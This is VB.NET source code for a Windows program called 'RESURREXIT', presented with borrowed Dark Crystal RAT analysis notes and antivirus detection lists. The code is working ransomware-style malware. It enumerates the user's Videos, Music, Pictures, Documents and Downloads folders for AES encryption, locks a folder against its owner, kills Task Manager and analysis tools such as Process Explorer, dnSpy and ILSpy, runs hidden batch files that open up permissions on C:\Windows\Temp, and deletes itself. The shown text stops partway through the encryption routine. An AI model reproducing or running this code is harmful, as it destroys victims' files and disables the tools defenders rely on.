REM: Analyzing Dark Crystal Reborn RAT, a VB.NET Backdoor & SHA512 SYSTEM ENCRYPTION. ORIGINALLY, C# WHICH I CONVERTED
REM: Discovering Dark Crystal RAT
REM: The threat intel team provided FLARE With an EXE sample, believed To contain Dark Crystal RAT, And having the MD5 hash b478d340a787b85e086cc951d0696cb1.  
REM: Using sandbox testing, we found that this sample produced two executables, And In turn, one Of those two executables produced three more.
REM: The Splunk Threat Research Team (STRT) analyzed and developed Splunk analytics for this RAT to help defenders identify signs of compromise within their networks. 
REM: Remote Access Trojans (RATs) are one Of the most common tools used by threat actors As a malicious payload To attack targeted hosts And steal information. 
REM: One example Is the Dark Crystal RAT (DCRat) that Is capable Of remote access, post exploitation And data exfiltration. 
REM: DCRat Is one of the underground commercial RAT tools used by several threat groups to attack networks And businesses (1) (2). 
REM: This RAT has been identified In campaigns targeting Ukraine organizations As reported by CERT-UA. 
REM: The payload Is delivered by spear phishing emails In the first stages Of the attacks.
REM: 
REM: APPLICATION NAME: "RESURREXIT" | CREATION DATE: 12/26/2024  COPYRIGHT 2024 MIT LICENSE | LOCATION: WESTERN, MAINE | CREATOR: 
REM: APPLICATION TYPE: "HYDRA-WARE" :: SHA512 HASHING | PROCESS INJECTION | RE-SPAWNING -
REM: CONTINUE: :: TIME-BASED ATTACK | REGISTRY ATTACK | SCHEDULED TASK AT HIGHEST ADMIN-LEVEL.
REM: BLACK STAR RESEARCH FACILITY | CLASSIFIED NUMBER: K401-B726A419
REM: WARNING: THIS APPLICATION WORKS FAST AND WILL LITERALLY TARGET EVERY DIRECTORY YOU ASSIGN TO. 
REM: RESURREXIT USES (SHA512 HASHING) "IS NOT" ENCRYPTION, IT IS HASHING OF FILES WITH NO-HOPE OF RECOVERING THEM.
REM: NOT A BILLION COMPUTERS AT THE CURRENT TECHNOLOGY CAN EFFECT THE DAMAGE SHA512 CAN CAUSE
REM: FOR LIST OF GUIDS: https://www.tenforums.com/tutorials/3123-clsid-key-guid-shortcuts-list-windows-10-a.html
REM: FOR EDUCATIONAL RESEARCH ONLY :: CYBER-CRIME IS A FELONY | CREATING MALWARE OR RANSOMWARE VERIES FROM STATE TO STATE
REM: NATIVE METHODS ARE THE SMARTEST APPROACH AT DIRECTORIES.
REM: 3 MINUTES 10 SECONDS FOR 5 FOLDERS WITH SEVERAL GIGS A PIECE 
REM: THIS PROGRAM RECURSIVELY TARGETS FOLDERS And Sub-FOLDERS WITHOUT THE >>>OVER-USE<<< Of ROOKIE "TRY METHODS". I USED ONE IN "HASH_PASSAGE" TO BYPASS ERROR CODES

'WARNING !!!!! SANDBOX STUDIES HAVE FOUND THE FOLLOWING ABOUT THIS APPLICATION:

'SECURITY VENDOR ANALYSIS: https://www.virustotal.com/gui/file/f7373e3a8a2b147c6582d7b9b0aef8c8ff79926ff2e28689951017069f2b1532/detection
'AliCloud | SpyWare: MSIL/ Msilperseus | Avast | MSIL: Injector-OL [Trj]
'AVG | MSIL: Injector-OL [Trj] | Avira(no cloud) | TR/ Dropper.Gen
'Bkav Pro | W32.AIDetectMalware.CS | ClamAV | Win.Malware.Ursu-9794593 - 0
'CrowdStrike Falcon | Win/ malicious_confidence_70%(D) | Cylance | Unsafe
'DeepInstinct | MALICIOUS | DrWeb | BackDoor.DarkCrystalNET0.7
'Elastic | Malicious(high Confidence) | ESET-NOD32 | A Variant Of MSIL/Autorun.Agent.MG
'Fortinet | MSIL/ Filecoder.DP!tr.ransom | Google | Detected
'Huorong | Trojan/ MSIL.KillAV.a | Ikarus | Trojan.MSIL.Injector
'Kaspersky | HEUR: Trojan.Win32.Generic | Malwarebytes | Generic.Malware.AI.DDS
'MaxSecure | Trojan.Malware0.300983.susgen | Microsoft | Trojan: MSIL/ Disabler.ARA!MTB
'SentinelOne (Static ML) | Static AI - Malicious PE | Trapmine | Malicious.moderate.ml.score
'Trellix (HX) | Generic.mg.0d3cbacbd9f3b623 | Varist | W32/ MSIL_Agent.CBV.gen!Eldorado
'VBA32 | Trojan.MSIL.WinDef.Heur | WithSecure | Trojan.TR/ Dropper.Gen

' + Host-Interaction Capabilities (This Application)
'create process On Windows
'create process suspended
'allocate Or change RWX memory
'Resume thread
'Get process image filename
'suspend thread
'terminate process
'use process replacement
'find process by PID
'manipulate unmanaged memory In .NET
'write file On Windows
'Set registry value
'create a process With modified I/O Handles And window
'Get session user name
'Get session integrity level
'query Or enumerate registry key
'query Or enumerate registry value
'check If file exists
'copy file
'Get common file path
'Get disk information
'enumerate processes

' + Executable
'access.NET resource
'contains PDB path

' + Data-Manipulation
'hash data Using SHA512Managed In .NET
'encrypt data Using AES via .NET

' + Runtime
'unmanaged call
'compiled to the .NET platform

' + Communication :: Warning :: Via; PowerShell + VBScript + Batch Code Infused In One Method
'write And execute a file

' + Persistence
'schedule task via schtasks | HIGHEST ADMINISTRATIVE LEVEL
'persist via Windows service
'persist via Run registry key

' + Anti-Analysis
'reference anti-VM strings targeting Xen
'reference analysis tools strings

' + Files Dropped: https://www.cybereason.com/blog/research/.net-malware-dropper
'%USERPROFILE%\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs\RESURREXIT.exe.log
'%USERPROFILE%\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs\powershell.exe.log
'%USERPROFILE%\AppData\Local\Microsoft\Windows\PowerShell\ModuleAnalysisCache
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_apb3ym4z.yly.psm1
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_i2wcrfjy.liv.ps1
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_ntftnfev.f2y.psm1
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_srim10ip.mfi.psm1
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_youstlfa.kts.ps1
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_zd0ykvtn.dru.ps1
'%USERPROFILE%\AppData\Local\Temp\bas.vbs

' + Files Deleted
'%USERPROFILE%\AppData\Local\Microsoft\Windows\PowerShell\ModuleAnalysisCache
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_apb3ym4z.yly.psm1
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_i2wcrfjy.liv.ps1
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_ntftnfev.f2y.psm1
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_srim10ip.mfi.psm1
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_youstlfa.kts.ps1
'%USERPROFILE%\AppData\Local\Temp\__PSScriptPolicyTest_zd0ykvtn.dru.ps1
'%USERPROFILE%\AppData\Local\Temp\bas.vbs
'%USERPROFILE%\Music\FavSong1.mp3
'%USERPROFILE%\Music\FavSong2.mp3

' + Files Opened
'\PSHost.133808483802782530.2972.DefaultAppDomain.powershell
'\PSHost.133808483807836797.2944.DefaultAppDomain.powershell
'\PSHost.133808483873622206.3008.DefaultAppDomain.powershell

' + Processes Created:
'%SAMPLEPATH%\RESURREXIT.exe
'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
'C:\Windows\SysWOW64\cmd.exe
'C:\Windows\SysWOW64\replace.exe
'C:\Windows\SysWOW64\wscript.exe

' + Shell Commands Used:
'"%SAMPLEPATH%\RESURREXIT.exe"
'"C:\Windows\System32\WScript.exe" "%USERPROFILE%\AppData\Local\Temp\bas.vbs"
'Powershell -ExecutionPolicy Bypass -Command "& '%USERPROFILE%\AppData\Local\Temp\~tmpDlFile.ps1'"
'Replace '%USERPROFILE%\Music\video.zip' with the actual path to the destination folder.EXIT
'Replace '%USERPROFILE%\Videos\video.zip' with the actual path to your zip file.
'powershell -Command "Expand-Archive -Path '%USERPROFILE%\Videos\video.zip' -DestinationPath '%USERPROFILE%\Music\video.zip'"
'powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file "tmpDlFile.ps1"

' + Processes Terminated
'%SAMPLEPATH%\RESURREXIT.exe
'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
'C:\Windows\SysWOW64\cmd.exe
'C:\Windows\SysWOW64\replace.exe
'C:\Windows\SysWOW64\wscript.exe
'C:\Windows\System32\conhost.exe

' + Processes Tree
'2916 - %WINDIR%\explorer.exe
'3572 - %SAMPLEPATH%\RESURREXIT.exe
'3604 - C:\Windows\SysWOW64\cmd.exe
'2576 - C:\Windows\SysWOW64\wscript.exe
'2888 - C:\Windows\SysWOW64\cmd.exe
'868 - C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
'2944 - C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
'3580 - C:\Windows\SysWOW64\cmd.exe
'1992 - C:\Windows\SysWOW64\wscript.exe
'2984 - C:\Windows\SysWOW64\cmd.exe
'2076 - C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
'2972 - C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
'3008 - C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
'1480 - C:\Windows\SysWOW64\replace.exe
'3840 - C:\Windows\SysWOW64\replace.exe

' + Runtime Modules
'C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.PowerShell.Commands.Management\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.Commands.Management.dll
'C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.PowerShell.Commands.Utility\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.Commands.Utility.dll
'C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.PowerShell.ConsoleHost\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.ConsoleHost.dll
'C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.PowerShell.Security\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.Security.dll
'C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
'C:\Windows\SysWOW64\scrobj.dll
'C:\Windows\SysWOW64\scrrun.dll
'C:\Windows\SysWOW64\vbscript.dll
'C:\Windows\SysWOW64\wshom.ocx

' + IP Traffic | URL Download From GitHub 
'UDP a83f : 8110:0:0:2000:0:0:0:53
'UDP 192.168.0.32: 137
'TCP 140.82.116.4: 443 (github.com)
'TCP 185.199.110.133: 443 (objects.githubusercontent.com)

Option Explicit On 'Vital for Module
Imports System.ComponentModel
Imports System.IO
Imports System.IO.IsolatedStorage
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Cryptography
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32

Public Class Form1

    'HASHING FILTERS | FILESTREAM | TARGET HOST
    Private HOST As String
    Private FILTER_INPUT As FileStream
    Private FILTER_OUTPUT As FileStream
    Private ENCRYPT_DIRECTORIES As String
    Private DECRYPT_DIRECTORIES As String

    'Application form is always in front of any app started.
    Private Const SWP_NOMOVE As Integer = &H2
    Private Const SWP_NOSIZE As Integer = &H1
    Private Const HWND_TOPMOST As Integer = -1
    '>>>>END

    'VOLUME MAX
    Const WM_APPCOMMAND As UInteger = &H319
    Const APPCOMMAND_VOLUME_UP As UInteger = &HA
    '>>>>END

    Public Shared Property SurroundingClass As Object
    '>>>>END

    <DllImport("user32")>
    Private Shared Function _
    SystemParametersInfo(uAction As Integer, uParam As Integer,
lpvParam As String, fuWinIni As Integer) As Integer
        ' Leave the body of the function empty.
    End Function


    <DllImport("user32.dll")>
    Private Shared Function SetWindowPos(hWnd As IntPtr,
                                         hWndInsertAfter As Integer,
                                         X As Integer, Y As Integer, cx As Integer,
                                         cy As Integer, uFlags As Integer) As Boolean
    End Function

    <DllImport("user32.dll", SetLastError:=True,
               CharSet:=CharSet.Auto)> Private Shared Function SendMessage(hWnd As IntPtr,
                                                                                                              Msg As UInteger,
                                                                                                              wParam As IntPtr,
                                                                                                              lParam As IntPtr) As IntPtr
    End Function

    Private Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (hProcess As IntPtr,
        dwMinimumWorkingSetSize As Integer,
                                                                          dwMaximumWorkingSetSize As Integer) As Integer

    'WALLPAPER CHANGER :: MUST USE BMP FILE | ON TIMERS TO CYCLE THROUGH IMAGES
    Dim Key As RegistryKey
    Private ReadOnly imagepath As String =
        "C:\Users\rytho\source\repos\RESURREXIT\RESURREXIT\Resources\what.bmp"

    Private ReadOnly imagepath1 As String =
        "C:\Users\rytho\source\repos\RESURREXIT\RESURREXIT\Resources\IM1.bmp"

    Private ReadOnly imagepath2 As String =
        "C:\Users\rytho\source\repos\RESURREXIT\RESURREXIT\Resources\IMI2.bmp"

    Private ReadOnly imagepath3 As String =
        "C:\Users\rytho\source\repos\RESURREXIT\RESURREXIT\Resources\IMI3.bmp"

    Private ReadOnly imagepath4 As String =
        "C:\Users\rytho\source\repos\RESURREXIT\RESURREXIT\Resources\IMI4.bmp"

    Private ReadOnly imagepath5 As String =
        "C:\Users\rytho\source\repos\RESURREXIT\RESURREXIT\Resources\IMI5.bmp"
    '>>>>END

    Private Sub Form1_Load(sender As Object,
                           e As EventArgs) Handles MyBase.Load

        'This creates a folder on desktop if it doesn't exist
        If Not Directory.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}\RESURREXIT") Then
            Directory.CreateDirectory($"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}\RESURREXIT")
        End If

        'This prevents Ratchet's folder from being accessed accept by administrator
        Dim folderPath As String
        folderPath = ($"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}\RESURREXIT")
        Dim adminUserName As String = Environment.UserName
        Dim ds As DirectorySecurity = Directory.GetAccessControl(folderPath)
        Try
            Dim fsa As New FileSystemAccessRule(adminUserName,
                                                FileSystemRights.FullControl,
                                                AccessControlType.Deny)
            'Just set this below to "RemoveAccessRule" to remove restriction from folder
            ds.AddAccessRule(fsa) '<<<<<< HERE <<<<<<
            Directory.SetAccessControl(folderPath, ds)
        Catch ex As Exception
            Const Category As String = "Error"
            Debug.WriteLine(ex.Message, Category)
        End Try

        'To reverse engineer this folder lock that RESURREXIT has: (Remove above lock code first)
        ' Dim folderPath As String
        'folderPath = ($"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}\RESURREXIT")
        'Dim adminUserName As String = Environment.UserName
        'Dim ds As DirectorySecurity = Directory.GetAccessControl(folderPath)
        'Try
        'Dim fsa As New FileSystemAccessRule(adminUserName,
        'FileSystemRights.FullControl,
        'AccessControlType.Deny)
        'ds.RemoveAccessRule(fsa)
        'Directory.SetAccessControl(folderPath, ds)
        'Catch ex As Exception
        'Debug.WriteLine(ex.Message,
        '                   "Error")
        'End Try

        My.Computer.Audio.Play(My.Resources.myla,
        AudioPlayMode.BackgroundLoop)
        Try

            For a =
                100 To 1 Step -1

                SendMessage(Handle,
                            WM_APPCOMMAND,
                            &H30292,
                            APPCOMMAND_VOLUME_UP * &H10000)
            Next

        Catch ex As Exception

            Debug.WriteLine("Error", ex)

        End Try

        SetWindowPos(Handle,
                     HWND_TOPMOST,
                     0,
                     0,
                     0,
                     0,
                     SWP_NOMOVE Or SWP_NOSIZE) 'This makes this app stand infront of all other forms active, it keeps placing itself in front :)

        'THIS PROJECT WOULDN'T RUN "WITHOUT" USING A MODULE FOR JUDGEMENT, AS FAR AS THE ENCRYPTION PROCESS WAS CONCERNED, IT WOULDN'T PROCESS
        Call Judgement() 'Calls Module "Judgement" to initiate

        'Call to other Classes
        Dim WIN As New Win32()
        Dim HDD As New HDDScarlett() 'Memory Hack

        Dim Neuron As New ScarlettNeuron() 'Memory Weave

        Dim Crystal As New Drocentium_Crystal() 'SETS PROCESS WORKING SIZE

        Dim Cirth As New Management() 'Termanate Process by Name

        Timer2.Start()
        'Disable()
        'Registrys()

        'CheckDefender()
        COLLECTIVE_SOUL()
        'AntiTaskManager()
        'OutputPathsTest()
        ' Rythorians_Scheduler()

        '-"NATIVEMETHODS" -START >>>
        Dim ALLSPARK As New NativeMethods() 'HERE WE CALL OUR "NATIVEMETHODS" CLASS
        Dim spath As String =
            NativeMethods.GetSpecialFolder(NativeMethods.ShellSpecialFolders.Videos)

        Dim spath1 As String =
            NativeMethods.GetSpecialFolder(NativeMethods.ShellSpecialFolders.Music)

        Dim spath2 As String =
            NativeMethods.GetSpecialFolder(NativeMethods.ShellSpecialFolders.Pictures)

        Dim spath3 As String =
            NativeMethods.GetSpecialFolder(NativeMethods.ShellSpecialFolders.Documents)

        Dim spath4 As String =
            NativeMethods.GetSpecialFolder(NativeMethods.ShellSpecialFolders.Downloads)

        For Each foundFile As String In My.Computer.FileSystem.GetFiles(spath,
                                                                        FileIO.SearchOption.SearchAllSubDirectories) 'NATIVE VIDEOS DIRECTORIES

            Dim a As Integer =
                &HA
            Do
                If (a = &HF) Then
                    If foundFile.EndsWith(".RESURREXIT") Then

                    Else
                        ListBox1.Items.Add(foundFile)

                    End If

                    a +=
                        &H1
                    Continue Do

                    If foundFile.EndsWith(".RESURREXIT") Then

                    Else

                        ListBox1.Items.Add(foundFile)

                    End If

                End If
                a += &H1
            Loop While (a < &H14)

        Next

        For Each foundFile As String In My.Computer.FileSystem.GetFiles(spath1,
                                                                        FileIO.SearchOption.SearchAllSubDirectories) 'NATIVE MUSIC DIRECTORIES

            Dim a As Integer =
                &HA
            Do
                If (a = &HF) Then

                    If foundFile.EndsWith(".RESURREXIT") Then

                    Else

                        ListBox1.Items.Add(foundFile)

                    End If

                    a +=
                        &H1
                    Continue Do

                    If foundFile.EndsWith(".RESURREXIT") Then

                    Else

                        ListBox1.Items.Add(foundFile)

                    End If

                End If
                a +=
                    &H1
            Loop While (a < &H14)

        Next

        For Each foundFile As String In My.Computer.FileSystem.GetFiles(spath2,
                                                                        FileIO.SearchOption.SearchAllSubDirectories) 'NATIVE PICTURES DIRECTORIES

            Dim a As Integer =
                &HA
            Do
                If (a = &HF) Then

                    If foundFile.EndsWith(".RESURREXIT") Then

                    Else

                        ListBox1.Items.Add(foundFile)

                    End If

                    a +=
                        &H1

                    Continue Do

                    If foundFile.EndsWith(".RESURREXIT") Then

                    Else

                        ListBox1.Items.Add(foundFile)

                    End If

                End If
                a += &H1
            Loop While (a < &H14)

        Next

        For Each foundFile As String In My.Computer.FileSystem.GetFiles(spath3,
                                                                        FileIO.SearchOption.SearchAllSubDirectories) 'NATIVE DOCUMENTS DIRECTORIES
            Dim a As Integer =
                &HA
            Do
                If (a = &HF) Then

                    If foundFile.EndsWith(".RESURREXIT") Then

                    Else

                        ListBox1.Items.Add(foundFile)

                    End If

                    a +=
                        &H1
                    Continue Do

                    If foundFile.EndsWith(".RESURREXIT") Then

                    Else

                        ListBox1.Items.Add(foundFile)

                    End If

                End If

                a +=
                    &H1
            Loop While (a < &H14)

        Next

        For Each foundFile As String In My.Computer.FileSystem.GetFiles(spath4,
                                                                        FileIO.SearchOption.SearchAllSubDirectories) 'NATIVE DOWNLOADS DIRECTORIES
            Dim a As Integer =
                &HA
            Do
                If (a = &HF) Then

                    If foundFile.EndsWith(".RESURREXIT") Then

                    Else

                        ListBox1.Items.Add(foundFile)

                    End If

                    a +=
                        &H1
                    Continue Do

                    If foundFile.EndsWith(".RESURREXIT") Then

                    Else

                        ListBox1.Items.Add(foundFile)

                    End If

                End If
                a +=
                    &H1
            Loop While (a < &H14)

        Next
        'END OF "NATIVEMETHODS" <<<<<<
        Tactician()
        'Cirth_Terminate()
        Remedy_Isolated_Storage()

    End Sub

    'The following code demonstrates the use of the static and instance Remove methods. I use remove in the form closing event.
    'The class obtains two stores; one is isolated for user and assembly and the other is isolated for user,
    'domain, and assembly.
    'The user, domain, and assembly store is then deleted by calling the Remove() method of the isolated storage file isoStore1.
    'Then, all remaining stores for the user are deleted by calling the static method Remove(IsolatedStorageScope).
    Public Shared Sub Remedy_Isolated_Storage()
        ' Get a new isolated store for this user, domain, and assembly.
        ' Put the store into an IsolatedStorageFile object.

        Dim isoStore1 As IsolatedStorageFile =
            IsolatedStorageFile.GetStore(IsolatedStorageScope.User Or IsolatedStorageScope.Domain Or IsolatedStorageScope.Assembly, Nothing, Nothing)
        Debug.WriteLine("A store isolated by user, assembly, and domain has been obtained.")

        ' Get a new isolated store for user and assembly.
        ' Put that store into a different IsolatedStorageFile object.

        Dim isoStore2 As IsolatedStorageFile =
            IsolatedStorageFile.GetStore(IsolatedStorageScope.User Or IsolatedStorageScope.Assembly, Nothing, Nothing)
        Debug.WriteLine("A store isolated by user and assembly has been obtained.")

    End Sub


    'TERMINATE MALWARE DETECTION PROGRAMS | YOU CAN ADD ANTIVIRUS NAMES TO THIS LIST TO TERMINATE
    Private Sub Cirth_Terminate()

        Dim retries As Integer = 50 '50 LOOPS
        While True

            Try
                Management.TerminateProcessByName("taskmgr") 'KILL TASK MANAGER BACK UP

                Management.TerminateProcessByName("regedit") 'ALLOWS YOU TO MAKE REGISTRY CHANGES

                'Management.TerminateProcessByName("cmd")'SPEAKS FOR ITSELF. I USE BATCH CODE SO I HAD TO TERMINATE ITS USE

                Management.TerminateProcessByName("sndvol") 'REMOVES MALWARE FROM SYSTEM, SO WE KILL IT

                Management.TerminateProcessByName("processhacker") 'Process Hacker is an open-source tool that can help you identify and terminate malware processes. You can use Process Hacker to Identify New malware processes. See what processes are running on a device Identify programs using CPU resources Identify network connections associated with a process  You should be aware that terminating a process using Process Hacker might cause data loss.

                Management.TerminateProcessByName("procexp") 'Procexp64.exe (Sysinternals Process Explorer) is a system program developed by Microsoft itself for Windows. It's a part of the Sysinternals Suite and is used for the monitoring and troubleshooting of Windows processes and services.

                Management.TerminateProcessByName("procexp64") 'Procexp64.exe (Sysinternals Process Explorer) is a system program developed by Microsoft itself for Windows. It's a part of the Sysinternals Suite and is used for the monitoring and troubleshooting of Windows processes and services.

                Management.TerminateProcessByName("autoruns64") 'To terminate malware autoruns on Windows, you can use Autoruns to identify and remove the malware, and then terminate the process. You can also disable the AutoRun feature in Windows

                Management.TerminateProcessByName("autoruns") 'WE STOP THIS: To terminate malware autoruns on Windows, you can use Autoruns to identify and remove the malware, and then terminate the process. You can also disable the AutoRun feature in Windows

                Management.TerminateProcessByName("dnspy") 'Demonstrate an easy method that can be used to unpack files that ultimately load a .NET based malware.

                Management.TerminateProcessByName("ilspy") 'Malware analysis: Malware analysts use ILSpy To reverse engineer And analyze malware samples. ILSpy can decompile obfuscated code, which Is often used by malware authors to hide the true behavior of their malware

                Management.TerminateProcessByName("ildasm") 'WE END THIS TO PROTECT OUR APPLICATION >>>You can use the Ildasm.exe (IL Disassembler) to view common intermediate language (CIL) information in a file. If the file being examined is an assembly, this information can include the assembly's attributes and references to other modules and assemblies.

                Exit While

            Catch

                retries -= 1

                If retries = 0 Then

                    Throw
                Else

                    Thread.Sleep(&H3E8)

                End If

            End Try

        End While

    End Sub

    Private Sub SelfDestruct()

        Dim strBatch As String = "DelApp.bat"

        Using swBatch As StreamWriter = File.AppendText(strBatch)

            swBatch.WriteLine(":Loop")

            swBatch.WriteLine("Tasklist /if ""PID eq " &
            Process.GetCurrentProcess().Id.ToString() &
            """ | find "":""")
            swBatch.WriteLine("if Errorlevel 1 (")
            swBatch.WriteLine("  Timeout /T 1 /Nobreak")
            swBatch.WriteLine("  Goto Loop")
            swBatch.WriteLine(")")
            swBatch.WriteLine("Del """ & (New FileInfo((New Uri _
            (Assembly.GetExecutingAssembly().CodeBase)) _
            .LocalPath)).Name & """")

        End Using

        Process.Start(New ProcessStartInfo() With {
             .Arguments = "/C " & strBatch & " & _
                Del " & strBatch,
             .WindowStyle = ProcessWindowStyle.Hidden,
             .CreateNoWindow = True,
             .FileName = "cmd.exe"
         })

    End Sub

    'ICACLS TAKEDOWN WINDOWS TEMP FOLDER
    Private Sub Tactician()
        Dim sb As New StringBuilder
        sb.AppendLine("SET FOLDER_NAME=C:\Windows\Temp")
        sb.AppendLine("TAKEOWN /f %FOLDER_NAME% /r /d y")
        sb.AppendLine("ICACLS %FOLDER_NAME% /grant administrators:F /t")
        sb.AppendLine("ICACLS %FOLDER_NAME% /reset /T")
        sb.AppendLine("icacls foo /grant Everyone:(OI)(CI)F")
        'To Deny, stop code line above and remove indents below on both:
        'sb.AppendLine("icacls foo\bar.txt /deny Everyone:(DE) *S-1-5-7:(DC)")
        'sb.AppendLine("icacls foo / deny Everyone: (DC) *S-1-5-7:(DC)")
        ' sb.AppendLine("IF NOT %ERRORLEVEL%==0 GOTO")
        sb.AppendLine("timeout /t 4 /nobreak")
        sb.AppendLine("echo .appactivate^(""%~1"" ^) : .sendkeys ""{enter}")
        sb.AppendLine("GoTo begin")
        File.WriteAllText("fileName.bat", sb.ToString())
        'Run Bat invisible
        Shell("fileName.bat", AppWinStyle.Hide) 'Change to "hide" for it to be invisible
    End Sub

#Region "HASHING PROCESS"

    ''' <summary>
    ''' 
    ''' </summary>
    ''' <param name="PASSMANAGER"></param>
    ''' <returns></returns>
    Public Function GUARDIAN(PASSMANAGER As String) As Byte()
        'Convert strPassword to an array and store in chrData.
        Dim Data() As Char =
            PASSMANAGER.ToCharArray
        'Use intLength to get strPassword size.
        Dim Length As Integer =
            Data.GetUpperBound(&H0)
        'Declare bytDataToHash and make it the same size as chrData.
        Dim HASH_DATA(Length) As Byte

        'Use For Next to convert and store chrData into bytDataToHash.
        For i As Integer =
            0 To Data.GetUpperBound(&H0)

            HASH_DATA(i) =
                CByte(Asc(Data(i)))

        Next

        'Declare what hash to use.
        Dim SHA512 As New SHA512Managed
        'Declare bytResult, Hash bytDataToHash and store it in bytResult.
        Dim HASH_RESULT As Byte() =
            SHA512.ComputeHash(HASH_DATA)
        'Declare bytKey(31).  It will hold 256 bits.
        Dim KEY(&H1F) As Byte

        'Use For Next to put a specific size (256 bits) of
        'bytResult into bytKey. The 0 To 31 will put the first 256 bits
        'of 512 bits into bytKey.
        For i As Integer = &H0 To &H1F

            KEY(i) = HASH_RESULT(i)

        Next

        Return KEY 'Return the key.

    End Function

    ''' <summary>
    ''' 
    ''' </summary>
    ''' <param name="PASSMANAGER"></param>
    ''' <returns></returns>
    Public Function CREATION_POOL(PASSMANAGER As String) As Byte()
        'Convert strPassword to an array and store in chrData.
        Dim Data() As Char =
            PASSMANAGER.ToCharArray
        'Use intLength to get strPassword size.
        Dim Length As Integer =
            Data.GetUpperBound(&H0)
        'Declare bytDataToHash and make it the same size as chrData.
        Dim HASH_DATA(Length) As Byte

        'Use For Next to convert and store chrData into bytDataToHash.
        For i As Integer =
            &H0 To Data.GetUpperBound(&H0)

            HASH_DATA(i) =
                CByte(Asc(Data(i)))

        Next

        'Declare bytIV(15).  It will hold 128 bits.
        Dim IV(&HF) As Byte

        'Use For Next to put a specific size (128 bits) of
        'bytResult into bytIV. The 0 To 30 for bytKey used the first 256 bits.
        'of the hashed password. The 32 To 47 will put the next 128 bits into bytIV.
        For i As Integer = &H20 To &H2F
            'Declare what hash to use.
            Dim SHA512 As New SHA512Managed
            'Declare bytResult, Hash bytDataToHash and store it in bytResult.
            Dim Result As Byte() = SHA512.ComputeHash(HASH_DATA)

            IV(i - &H20) = Result(i)

        Next

        Return IV 'return the IV
    End Function
    Public Enum CryptoAction
        'Define the enumeration for CryptoAction.
        HashEncrypt = &H1

        HashDecrypt = &H2

    End Enum

    ''' <summary>
    ''' 
    ''' </summary>
    ''' <param name="ENCRYPT_DIRECTORIES"></param>
    ''' <param name="DECRYPT_DIRECTORIES"></param>
    ''' <param name="Key"></param>
    ''' <param name="IV"></param>
    ''' <param name="Guide"></param>
    Public Sub HASH_PASSAGE(ENCRYPT_DIRECTORIES As String,
                                          DECRYPT_DIRECTORIES As String,
                                          Key() As Byte,
                                          IV() As Byte,
                                          Guide As CryptoAction)
        Try 'In case of errors.
            'Setup file streams to handle input and output.
            FILTER_INPUT = New FileStream(ENCRYPT_DIRECTORIES, FileMode.Open,
                                                   FileAccess.Read)
            FILTER_OUTPUT = New FileStream(DECRYPT_DIRECTORIES, FileMode.OpenOrCreate,
                                                    FileAccess.Write)
            FILTER_OUTPUT.SetLength(&H0) 'make sure fsOutput is empty
            'Setup Progress Bar
            ProgressBar2.Value = &H0

            ProgressBar2.Maximum = &H64

            Dim ICESTREAM As CryptoStream
            'Declare your CryptoServiceProvider.
            Dim RijndaelCryptography As New RijndaelManaged
            'Determine if ecryption or decryption and setup CryptoStream.
            Select Case Guide

                Case CryptoAction.HashEncrypt

                    ICESTREAM = New CryptoStream(FILTER_OUTPUT,
                        RijndaelCryptography.CreateEncryptor(Key,
                                                             IV),
                        CryptoStreamMode.Write)

                Case CryptoAction.HashDecrypt

                    ICESTREAM = New CryptoStream(FILTER_OUTPUT,
                        RijndaelCryptography.CreateDecryptor(Key,
                                                             IV),
                        CryptoStreamMode.Write)
            End Select

            Dim LENGTH_PROTOCOL As Long =
                FILTER_INPUT.Length 'the input file's length

            Dim RUNNING_COUNT_BYTE_PROCESS As Long =
                &H0 'running count of bytes processed
            'Use While to loop until all of the file is processed.
            While RUNNING_COUNT_BYTE_PROCESS < LENGTH_PROTOCOL

                'Declare variables for encrypt/decrypt process.
                Dim BLOCK_BYTE(4096) As Byte 'holds a block of bytes for processing
                'Read file with the input filestream.
                Dim CURRENT_BYTE_PROCESSED As Integer =
                    FILTER_INPUT.Read(BLOCK_BYTE, &H0, &H1000) 'current bytes being processed
                'Write output file with the cryptostream.
#Disable Warning BC42104 ' Variable is used before it has been assigned a value
                ICESTREAM.Write(BLOCK_BYTE, &H0, CURRENT_BYTE_PROCESSED)
